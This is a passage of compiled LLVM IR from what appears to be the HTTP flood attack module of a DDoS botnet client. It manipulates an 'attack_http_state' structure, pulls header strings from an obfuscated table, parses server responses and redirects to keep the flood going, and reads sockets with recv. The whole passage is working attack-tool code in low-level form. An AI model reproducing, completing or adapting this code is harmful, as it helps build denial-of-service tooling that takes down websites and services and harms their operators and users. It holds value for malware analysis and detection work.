  %454 = icmp eq i32 %453, -1
  br i1 %454, label %479, label %455

; <label>:455:                                    ; preds = %450
  %456 = call i8* @table_retrieve_val(i32 69, i32* null)
  %457 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %456)
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %458
  %460 = load i8, i8* %459, align 1
  %461 = icmp eq i8 %460, 32
  %462 = zext i1 %461 to i32
  %.575 = add nsw i32 %462, %457
  %463 = sext i32 %.575 to i64
  %464 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %463
  %465 = sub nsw i32 %427, %.575
  %466 = call i32 @util_memsearch(i8* %464, i32 %465, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %467 = icmp eq i32 %466, -1
  br i1 %467, label %479, label %468

; <label>:468:                                    ; preds = %455
  %469 = icmp sgt i32 %466, 1
  %470 = add nsw i32 %466, -2
  %.576 = select i1 %469, i32 %470, i32 %466
  %471 = add nsw i32 %.575, %.576
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %472
  store i8 0, i8* %473, align 1
  %474 = call i32 @util_strlen(i8* %464)
  %475 = call i8* @table_retrieve_val(i32 68, i32* null)
  %476 = call i32 @util_stristr(i8* %464, i32 %474, i8* %475)
  %477 = icmp eq i32 %476, 0
  br i1 %477, label %479, label %478

; <label>:478:                                    ; preds = %468
  store i32 1, i32* %451, align 4
  br label %479

; <label>:479:                                    ; preds = %468, %455, %450, %478
  %480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 13
  store i32 0, i32* %480, align 4
  %481 = call i8* @table_retrieve_val(i32 66, i32* null)
  %482 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %481)
  %483 = icmp eq i32 %482, -1
  br i1 %483, label %508, label %484

; <label>:484:                                    ; preds = %479
  %485 = call i8* @table_retrieve_val(i32 66, i32* null)
  %486 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %485)
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %487
  %489 = load i8, i8* %488, align 1
  %490 = icmp eq i8 %489, 32
  %491 = zext i1 %490 to i32
  %.577 = add nsw i32 %491, %486
  %492 = sext i32 %.577 to i64
  %493 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %492
  %494 = sub nsw i32 %427, %.577
  %495 = call i32 @util_memsearch(i8* %493, i32 %494, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %496 = icmp eq i32 %495, -1
  br i1 %496, label %508, label %497

; <label>:497:                                    ; preds = %484
  %498 = icmp sgt i32 %495, 1
  %499 = add nsw i32 %495, -2
  %.578 = select i1 %498, i32 %499, i32 %495
  %500 = add nsw i32 %.577, %.578
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %501
  store i8 0, i8* %502, align 1
  %503 = call i32 @util_strlen(i8* %493)
  %504 = call i8* @table_retrieve_val(i32 67, i32* null)
  %505 = call i32 @util_stristr(i8* %493, i32 %503, i8* %504)
  %506 = icmp eq i32 %505, 0
  br i1 %506, label %508, label %507

; <label>:507:                                    ; preds = %497
  store i32 1, i32* %480, align 4
  br label %508

; <label>:508:                                    ; preds = %497, %484, %479, %507
  %509 = call i8* @table_retrieve_val(i32 65, i32* null)
  %510 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %509)
  %511 = icmp eq i32 %510, -1
  br i1 %511, label %.sink.split, label %512

; <label>:512:                                    ; preds = %508
  %513 = call i8* @table_retrieve_val(i32 65, i32* null)
  %514 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %513)
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %515
  %517 = load i8, i8* %516, align 1
  %518 = icmp eq i8 %517, 32
  %519 = zext i1 %518 to i32
  %.579 = add nsw i32 %519, %514
  %520 = sext i32 %.579 to i64
  %521 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %520
  %522 = sub nsw i32 %427, %.579
  %523 = call i32 @util_memsearch(i8* %521, i32 %522, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %524 = icmp eq i32 %523, -1
  br i1 %524, label %.preheader615, label %525

; <label>:525:                                    ; preds = %512
  %526 = icmp sgt i32 %523, 1
  %527 = add nsw i32 %523, -2
  %.580 = select i1 %526, i32 %527, i32 %523
  %528 = add nsw i32 %.579, %.580
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %529
  store i8 0, i8* %530, align 1
  %531 = call i32 @util_atoi(i8* %521, i32 10)
  br label %.sink.split

.sink.split:                                      ; preds = %508, %525
  %.sink6 = phi i32 [ %531, %525 ], [ 0, %508 ]
  %532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 14
  store i32 %.sink6, i32* %532, align 4
  br label %.preheader615

.preheader615:                                    ; preds = %512, %.sink.split
  %533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 15
  %534 = call i8* @table_retrieve_val(i32 64, i32* null)
  %535 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %534)
  %536 = icmp eq i32 %535, -1
  br i1 %536, label %.critedge581, label %.lr.ph656.preheader

.lr.ph656.preheader:                              ; preds = %.preheader615
  br label %.lr.ph656

.lr.ph656:                                        ; preds = %.lr.ph656.preheader, %.loopexit
  %537 = phi i8* [ %.pre707, %.loopexit ], [ %21, %.lr.ph656.preheader ]
  %.0559655 = phi i32 [ %.pre704, %.loopexit ], [ 0, %.lr.ph656.preheader ]
  %538 = load i32, i32* %533, align 4
  %539 = icmp slt i32 %538, 5
  br i1 %539, label %540, label %.critedge581.loopexit

; <label>:540:                                    ; preds = %.lr.ph656
  %541 = call i8* @table_retrieve_val(i32 64, i32* null)
  %542 = call i32 @util_stristr(i8* %537, i32 %427, i8* %541)
  %543 = add nsw i32 %542, %.0559655
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %544
  %546 = load i8, i8* %545, align 1
  %547 = icmp eq i8 %546, 32
  %548 = zext i1 %547 to i32
  %.582 = add nsw i32 %548, %542
  %549 = sext i32 %.582 to i64
  %550 = getelementptr inbounds i8, i8* %537, i64 %549
  %551 = sub nsw i32 %427, %.0559655
  %552 = sub i32 %551, %.582
  %553 = call i32 @util_memsearch(i8* %550, i32 %552, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %554 = icmp eq i32 %553, -1
  %.pre704 = add nsw i32 %.582, %.0559655
  %.pre705 = sext i32 %.pre704 to i64
  %.pre707 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %.pre705
  br i1 %554, label %.loopexit, label %555

; <label>:555:                                    ; preds = %540
  %556 = icmp sgt i32 %553, 1
  %557 = add nsw i32 %553, -2
  %.583 = select i1 %556, i32 %557, i32 %553
  %558 = call i32 @util_memsearch(i8* %550, i32 %552, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %559 = icmp sgt i32 %558, 0
  %560 = add nsw i32 %558, -1
  %..583 = select i1 %559, i32 %560, i32 %.583
  %561 = add nsw i32 %..583, %.pre704
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %562
  store i8 0, i8* %563, align 1
  store i32 0, i32* %5, align 4
  %564 = call i32 @util_strlen(i8* nonnull %.pre707)
  %565 = icmp sgt i32 %564, 0
  br i1 %565, label %.lr.ph649.preheader, label %._crit_edge650

.lr.ph649.preheader:                              ; preds = %555
  br label %.lr.ph649

; <label>:566:                                    ; preds = %.lr.ph649
  %567 = trunc i64 %indvars.iv.next687 to i32
  store i32 %567, i32* %5, align 4
  %568 = call i32 @util_strlen(i8* nonnull %.pre707)
  %569 = sext i32 %568 to i64
  %570 = icmp slt i64 %indvars.iv.next687, %569
  br i1 %570, label %.lr.ph649, label %._crit_edge650.loopexit

.lr.ph649:                                        ; preds = %.lr.ph649.preheader, %566
  %571 = phi i32 [ %567, %566 ], [ 0, %.lr.ph649.preheader ]
  %indvars.iv686 = phi i64 [ %indvars.iv.next687, %566 ], [ 0, %.lr.ph649.preheader ]
  %572 = getelementptr inbounds i8, i8* %.pre707, i64 %indvars.iv686
  %573 = load i8, i8* %572, align 1
  %574 = icmp eq i8 %573, 61
  %indvars.iv.next687 = add nuw i64 %indvars.iv686, 1
  br i1 %574, label %._crit_edge650.loopexit, label %566

._crit_edge650.loopexit:                          ; preds = %.lr.ph649, %566
  %.ph = phi i32 [ %567, %566 ], [ %571, %.lr.ph649 ]
  br label %._crit_edge650

._crit_edge650:                                   ; preds = %._crit_edge650.loopexit, %555
  %575 = phi i32 [ 0, %555 ], [ %.ph, %._crit_edge650.loopexit ]
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds i8, i8* %.pre707, i64 %576
  %578 = load i8, i8* %577, align 1
  %579 = icmp eq i8 %578, 61
  br i1 %579, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge650
  store i32 0, i32* %5, align 4
  %580 = load i32, i32* %533, align 4
  %581 = icmp sgt i32 %580, 0
  br i1 %581, label %.lr.ph653.preheader, label %.critedge584

.lr.ph653.preheader:                              ; preds = %.preheader
  %582 = sext i32 %580 to i64
  br label %.lr.ph653

; <label>:583:                                    ; preds = %.lr.ph653
  %584 = trunc i64 %indvars.iv.next689 to i32
  store i32 %584, i32* %5, align 4
  %585 = icmp slt i64 %indvars.iv.next689, %582
  br i1 %585, label %.lr.ph653, label %.critedge584.loopexit

.lr.ph653:                                        ; preds = %.lr.ph653.preheader, %583
  %indvars.iv688 = phi i64 [ %indvars.iv.next689, %583 ], [ 0, %.lr.ph653.preheader ]
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 16, i64 %indvars.iv688, i64 0
  %587 = call signext i8 @util_strncmp(i8* %.pre707, i8* %586, i32 %575)
  %588 = icmp eq i8 %587, 0
  %indvars.iv.next689 = add nuw i64 %indvars.iv688, 1
  br i1 %588, label %583, label %.loopexit.loopexit

.critedge584.loopexit:                            ; preds = %583
  br label %.critedge584

.critedge584:                                     ; preds = %.critedge584.loopexit, %.preheader
  %589 = call i32 @util_strlen(i8* %.pre707)
  %590 = icmp slt i32 %589, 128
  br i1 %590, label %591, label %.loopexit

; <label>:591:                                    ; preds = %.critedge584
  %592 = sext i32 %580 to i64
  %593 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 16, i64 %592, i64 0
  %594 = call i32 @util_strcpy(i8* %593, i8* %.pre707)
  %595 = load i32, i32* %533, align 4
  %596 = add nsw i32 %595, 1
  store i32 %596, i32* %533, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph653
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %540, %._crit_edge650, %.critedge584, %591
  %597 = call i8* @table_retrieve_val(i32 64, i32* null)
  %598 = call i32 @util_stristr(i8* %.pre707, i32 %427, i8* %597)
  %599 = icmp eq i32 %598, -1
  br i1 %599, label %.critedge581.loopexit, label %.lr.ph656

.critedge581.loopexit:                            ; preds = %.loopexit, %.lr.ph656
  br label %.critedge581

.critedge581:                                     ; preds = %.critedge581.loopexit, %.preheader615
  %600 = call i8* @table_retrieve_val(i32 63, i32* null)
  %601 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %600)
  %602 = icmp eq i32 %601, -1
  br i1 %602, label %678, label %603

; <label>:603:                                    ; preds = %.critedge581
  %604 = call i8* @table_retrieve_val(i32 63, i32* null)
  %605 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %604)
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %606
  %608 = load i8, i8* %607, align 1
  %609 = icmp eq i8 %608, 32
  %610 = zext i1 %609 to i32
  %.585 = add nsw i32 %610, %605
  %611 = sext i32 %.585 to i64
  %612 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %611
  %613 = sub nsw i32 %427, %.585
  %614 = call i32 @util_memsearch(i8* %612, i32 %613, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %615 = icmp eq i32 %614, -1
  br i1 %615, label %678, label %616

; <label>:616:                                    ; preds = %603
  %617 = icmp sgt i32 %614, 1
  %618 = add nsw i32 %614, -2
  %.586 = select i1 %617, i32 %618, i32 %614
  %619 = add nsw i32 %.585, %.586
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %620
  store i8 0, i8* %621, align 1
  %622 = add nsw i32 %.586, 1
  %623 = call i32 @util_memsearch(i8* %612, i32 %622, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %624 = icmp eq i32 %623, 4
  br i1 %624, label %625, label %664

; <label>:625:                                    ; preds = %616
  %626 = getelementptr inbounds i8, i8* %612, i64 4
  %627 = load i8, i8* %626, align 1
  %628 = icmp eq i8 %627, 115
  %.587 = select i1 %628, i32 8, i32 7
  store i32 %.587, i32* %5, align 4
  %629 = zext i32 %.587 to i64
  %630 = getelementptr inbounds i8, i8* %612, i64 %629
  %631 = sub nsw i32 %622, %.587
  %632 = sext i32 %631 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %612, i8* %630, i64 %632, i32 1, i1 false)
  br label %633

; <label>:633:                                    ; preds = %638, %625
  %indvars.iv690 = phi i64 [ %indvars.iv.next691, %638 ], [ 0, %625 ]
  %634 = getelementptr inbounds i8, i8* %612, i64 %indvars.iv690
  %635 = load i8, i8* %634, align 1
  switch i8 %635, label %638 [
    i8 0, label %.loopexit614
    i8 47, label %636
  ]

; <label>:636:                                    ; preds = %633
  %637 = trunc i64 %indvars.iv690 to i32
  store i32 %637, i32* %5, align 4
  store i8 0, i8* %634, align 1
  br label %640

; <label>:638:                                    ; preds = %633
  %indvars.iv.next691 = add nuw i64 %indvars.iv690, 1
  br label %633

.loopexit614:                                     ; preds = %633
  %639 = trunc i64 %indvars.iv690 to i32
  store i32 %639, i32* %5, align 4
  br label %640

; <label>:640:                                    ; preds = %.loopexit614, %636
  %641 = phi i32 [ %639, %.loopexit614 ], [ %637, %636 ]
  %642 = call i32 @util_strlen(i8* nonnull %612)
  %.off609 = add i32 %642, -1
  %643 = icmp ult i32 %.off609, 127
  br i1 %643, label %644, label %647

; <label>:644:                                    ; preds = %640
  %645 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 7, i64 0
  %646 = call i32 @util_strcpy(i8* %645, i8* nonnull %612)
  %.pre701 = load i32, i32* %5, align 4
  br label %647

; <label>:647:                                    ; preds = %644, %640
  %648 = phi i32 [ %.pre701, %644 ], [ %641, %640 ]
  %649 = add nsw i32 %648, 1
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds i8, i8* %612, i64 %650
  %652 = call i32 @util_strlen(i8* %651)
  %653 = icmp slt i32 %652, 256
  br i1 %653, label %654, label %677

; <label>:654:                                    ; preds = %647
  %655 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %655, i32 255)
  %656 = load i32, i32* %5, align 4
  %657 = add nsw i32 %656, 1
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds i8, i8* %612, i64 %658
  %660 = call i32 @util_strlen(i8* %659)
  %661 = icmp sgt i32 %660, 0
  br i1 %661, label %662, label %677

; <label>:662:                                    ; preds = %654
  %663 = call i32 @util_strcpy(i8* %655, i8* %659)
  br label %677

; <label>:664:                                    ; preds = %616
  %665 = load i8, i8* %612, align 1
  %666 = icmp eq i8 %665, 47
  br i1 %666, label %667, label %677

; <label>:667:                                    ; preds = %664
  %668 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %668, i32 255)
  %669 = load i32, i32* %5, align 4
  %670 = add nsw i32 %669, 1
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds i8, i8* %612, i64 %671
  %673 = call i32 @util_strlen(i8* %672)
  %.off608 = add i32 %673, -1
  %674 = icmp ult i32 %.off608, 255
  br i1 %674, label %675, label %677

; <label>:675:                                    ; preds = %667
  %676 = call i32 @util_strcpy(i8* %668, i8* %672)
  br label %677

; <label>:677:                                    ; preds = %664, %675, %667, %647, %662, %654
  store i8 1, i8* %414, align 4
  br label %.loopexit617

; <label>:678:                                    ; preds = %603, %.critedge581
  %679 = call i8* @table_retrieve_val(i32 62, i32* null)
  %680 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %679)
  %681 = icmp eq i32 %680, -1
  br i1 %681, label %820, label %682

; <label>:682:                                    ; preds = %678
  %683 = call i8* @table_retrieve_val(i32 62, i32* null)
  %684 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %683)
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %685
  %687 = load i8, i8* %686, align 1
  %688 = icmp eq i8 %687, 32
  %689 = zext i1 %688 to i32
  %.588 = add nsw i32 %689, %684
  %690 = sext i32 %.588 to i64
  %691 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %690
  %692 = sub nsw i32 %427, %.588
  %693 = call i32 @util_memsearch(i8* %691, i32 %692, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %694 = icmp eq i32 %693, -1
  br i1 %694, label %820, label %695

; <label>:695:                                    ; preds = %682
  %696 = icmp sgt i32 %693, 1
  %697 = add nsw i32 %693, -2
  %.589 = select i1 %696, i32 %697, i32 %693
  %698 = add nsw i32 %.588, %.589
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %699
  store i8 0, i8* %700, align 1
  br label %701

; <label>:701:                                    ; preds = %701, %695
  %indvars.iv692 = phi i64 [ %indvars.iv.next693, %701 ], [ 0, %695 ]
  %702 = getelementptr inbounds i8, i8* %691, i64 %indvars.iv692
  %703 = load i8, i8* %702, align 1
  %.off610 = add i8 %703, -48
  %704 = icmp ult i8 %.off610, 10
  %indvars.iv.next693 = add nuw i64 %indvars.iv692, 1
  br i1 %704, label %701, label %.critedge

.critedge:                                        ; preds = %701
  %705 = add nsw i32 %.589, 1
  %706 = trunc i64 %indvars.iv692 to i32
  store i32 %706, i32* %5, align 4
  %707 = icmp eq i8 %703, 0
  br i1 %707, label %820, label %708

; <label>:708:                                    ; preds = %.critedge
  store i8 0, i8* %702, align 1
  %709 = add nsw i32 %706, 1
  store i32 %709, i32* %5, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds i8, i8* %691, i64 %710
  %712 = load i8, i8* %711, align 1
  %713 = icmp eq i8 %712, 32
  br i1 %713, label %714, label %716

; <label>:714:                                    ; preds = %708
  %715 = add nsw i32 %706, 2
  store i32 %715, i32* %5, align 4
  br label %716

; <label>:716:                                    ; preds = %714, %708
  %717 = phi i32 [ %715, %714 ], [ %709, %708 ]
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds i8, i8* %691, i64 %718
  %720 = call i32 @util_strlen(i8* %719)
  %721 = call i32 @util_stristr(i8* %719, i32 %720, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %722 = icmp eq i32 %721, -1
  br i1 %722, label %725, label %723

; <label>:723:                                    ; preds = %716
  %724 = add nsw i32 %721, %717
  store i32 %724, i32* %5, align 4
  br label %725

; <label>:725:                                    ; preds = %716, %723
  %726 = phi i32 [ %717, %716 ], [ %724, %723 ]
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds i8, i8* %691, i64 %727
  %729 = load i8, i8* %728, align 1
  %730 = icmp eq i8 %729, 34
  br i1 %730, label %731, label %742

; <label>:731:                                    ; preds = %725
  %732 = add nsw i32 %726, 1
  store i32 %732, i32* %5, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %691, i64 %733
  %735 = call i32 @util_strlen(i8* %734)
  %736 = add nsw i32 %735, -1
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %734, i64 %737
  %739 = load i8, i8* %738, align 1
  %740 = icmp eq i8 %739, 34
  br i1 %740, label %741, label %742

; <label>:741:                                    ; preds = %731
  store i8 0, i8* %738, align 1
  br label %742

; <label>:742:                                    ; preds = %731, %741, %725
  %743 = phi i32 [ %732, %731 ], [ %732, %741 ], [ %726, %725 ]
  %744 = call i32 @util_atoi(i8* nonnull %691, i32 10)
  %745 = add i32 %744, %376
  %746 = zext i32 %745 to i64
  %.off = add i32 %744, -1
  %747 = icmp ult i32 %.off, 9
  br i1 %747, label %.lr.ph660.split.us.preheader, label %.critedge12

.lr.ph660.split.us.preheader:                     ; preds = %742
  %748 = call i64 @time(i64* null) #10
  %749 = icmp sgt i64 %746, %748
  br i1 %749, label %.lr.ph660.split.us.preheader744, label %.critedge12.loopexit

.lr.ph660.split.us.preheader744:                  ; preds = %.lr.ph660.split.us.preheader
  br label %.lr.ph660.split.us

.lr.ph660.split.us:                               ; preds = %.lr.ph660.split.us.preheader744, %.lr.ph660.split.us
  %750 = call i32 @sleep(i32 1) #10
  %751 = call i64 @time(i64* null) #10
  %752 = icmp sgt i64 %746, %751
  br i1 %752, label %.lr.ph660.split.us, label %.critedge12.loopexit.loopexit

.critedge12.loopexit.loopexit:                    ; preds = %.lr.ph660.split.us
  br label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.critedge12.loopexit.loopexit, %.lr.ph660.split.us.preheader
  %.pre702 = load i32, i32* %5, align 4
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %742
  %753 = phi i32 [ %.pre702, %.critedge12.loopexit ], [ %743, %742 ]
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds i8, i8* %691, i64 %754
  %756 = call i32 @util_strlen(i8* %755)
  %757 = call i32 @util_stristr(i8* %755, i32 %756, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  %758 = icmp eq i32 %757, 4
  br i1 %758, label %759, label %798

; <label>:759:                                    ; preds = %.critedge12
  %760 = getelementptr inbounds i8, i8* %755, i64 4
  %761 = load i8, i8* %760, align 1
  %762 = icmp eq i8 %761, 115
  %.592 = select i1 %762, i32 8, i32 7
  store i32 %.592, i32* %5, align 4
  %763 = zext i32 %.592 to i64
  %764 = getelementptr inbounds i8, i8* %755, i64 %763
  %765 = sub i32 %705, %.592
  %766 = sext i32 %765 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %755, i8* %764, i64 %766, i32 1, i1 false)
  br label %767

; <label>:767:                                    ; preds = %772, %759
  %indvars.iv694 = phi i64 [ %indvars.iv.next695, %772 ], [ 0, %759 ]
  %768 = getelementptr inbounds i8, i8* %755, i64 %indvars.iv694
  %769 = load i8, i8* %768, align 1
  switch i8 %769, label %772 [
    i8 0, label %.loopexit613
    i8 47, label %770
  ]

; <label>:770:                                    ; preds = %767
  %771 = trunc i64 %indvars.iv694 to i32
  store i32 %771, i32* %5, align 4
  store i8 0, i8* %768, align 1
  br label %774

; <label>:772:                                    ; preds = %767
  %indvars.iv.next695 = add nuw i64 %indvars.iv694, 1
  br label %767

.loopexit613:                                     ; preds = %767
  %773 = trunc i64 %indvars.iv694 to i32
  store i32 %773, i32* %5, align 4
  br label %774

; <label>:774:                                    ; preds = %.loopexit613, %770
  %775 = phi i32 [ %773, %.loopexit613 ], [ %771, %770 ]
  %776 = call i32 @util_strlen(i8* nonnull %755)
  %.off611 = add i32 %776, -1
  %777 = icmp ult i32 %.off611, 127
  br i1 %777, label %778, label %781

; <label>:778:                                    ; preds = %774
  %779 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 7, i64 0
  %780 = call i32 @util_strcpy(i8* %779, i8* nonnull %755)
  %.pre703 = load i32, i32* %5, align 4
  br label %781

; <label>:781:                                    ; preds = %778, %774
  %782 = phi i32 [ %.pre703, %778 ], [ %775, %774 ]
  %783 = add nsw i32 %782, 1
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds i8, i8* %755, i64 %784
  %786 = call i32 @util_strlen(i8* %785)
  %787 = icmp slt i32 %786, 256
  br i1 %787, label %788, label %817

; <label>:788:                                    ; preds = %781
  %789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %789, i32 255)
  %790 = load i32, i32* %5, align 4
  %791 = add nsw i32 %790, 1
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds i8, i8* %755, i64 %792
  %794 = call i32 @util_strlen(i8* %793)
  %795 = icmp sgt i32 %794, 0
  br i1 %795, label %796, label %817

; <label>:796:                                    ; preds = %788
  %797 = call i32 @util_strcpy(i8* %789, i8* %793)
  br label %817

; <label>:798:                                    ; preds = %.critedge12
  %799 = load i8, i8* %755, align 1
  %800 = icmp eq i8 %799, 47
  br i1 %800, label %801, label %817

; <label>:801:                                    ; preds = %798
  %802 = add nsw i32 %753, 1
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds i8, i8* %755, i64 %803
  %805 = call i32 @util_strlen(i8* %804)
  %806 = icmp slt i32 %805, 256
  br i1 %806, label %807, label %817

; <label>:807:                                    ; preds = %801
  %808 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %808, i32 255)
  %809 = load i32, i32* %5, align 4
  %810 = add nsw i32 %809, 1
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds i8, i8* %755, i64 %811
  %813 = call i32 @util_strlen(i8* %812)
  %814 = icmp sgt i32 %813, 0
  br i1 %814, label %815, label %817

; <label>:815:                                    ; preds = %807
  %816 = call i32 @util_strcpy(i8* %808, i8* %812)
  br label %817

; <label>:817:                                    ; preds = %798, %807, %815, %801, %781, %796, %788
  %818 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 9, i64 0
  %819 = bitcast i8* %818 to i32*
  store i32 5522759, i32* %819, align 1
  store i8 10, i8* %414, align 4
  br label %.loopexit617

; <label>:820:                                    ; preds = %.critedge, %682, %678
  %821 = call i32 @util_memsearch(i8* nonnull %21, i32 %427, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 9, i64 0
  %823 = call signext i8 @util_strcmp(i8* %822, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %824 = icmp eq i8 %823, 0
  br i1 %824, label %825, label %830

; <label>:825:                                    ; preds = %820
  %826 = call signext i8 @util_strcmp(i8* %822, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %827 = icmp eq i8 %826, 0
  br i1 %827, label %828, label %830

; <label>:828:                                    ; preds = %825
  %829 = icmp sgt i32 %427, %821
  %.sink13 = select i1 %829, i8 10, i8 1
  br label %830

; <label>:830:                                    ; preds = %820, %825, %828
  %storemerge562 = phi i8 [ %.sink13, %828 ], [ 7, %825 ], [ 7, %820 ]
  store i8 %storemerge562, i8* %414, align 4
  %831 = load i32, i32* %378, align 4
  %832 = sext i32 %821 to i64
  %833 = call i64 @recv(i32 %831, i8* nonnull %21, i64 %832, i32 16384) #10
  br label %.loopexit617

; <label>:834:                                    ; preds = %.preheader616, %.backedge
  %835 = load i32, i32* %416, align 4
  %836 = icmp eq i32 %835, 1024
  br i1 %836, label %837, label %838

; <label>:837:                                    ; preds = %834
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %417, i8* nonnull %418, i64 960, i32 1, i1 false)
  store i32 960, i32* %416, align 4
  br label %838

; <label>:838:                                    ; preds = %837, %834
  %839 = tail call i32* @__errno_location() #11
  store i32 0, i32* %839, align 4
  %840 = load i32, i32* %378, align 4
  %841 = load i32, i32* %416, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %842
  %844 = sub nsw i32 1024, %841
  %845 = sext i32 %844 to i64
  %846 = call i64 @recv(i32 %840, i8* %843, i64 %845, i32 16384) #10
  %847 = trunc i64 %846 to i32
  switch i32 %847, label %853 [
    i32 0, label %.thread601
    i32 -1, label %848
  ]

.thread601:                                       ; preds = %838
  store i32 104, i32* %839, align 4
  br label %850

; <label>:848:                                    ; preds = %838
  %.pr600 = load i32, i32* %839, align 4
  %849 = icmp eq i32 %.pr600, 11
  br i1 %849, label %.loopexit617, label %850

; <label>:850:                                    ; preds = %.thread601, %848
  %851 = load i32, i32* %378, align 4
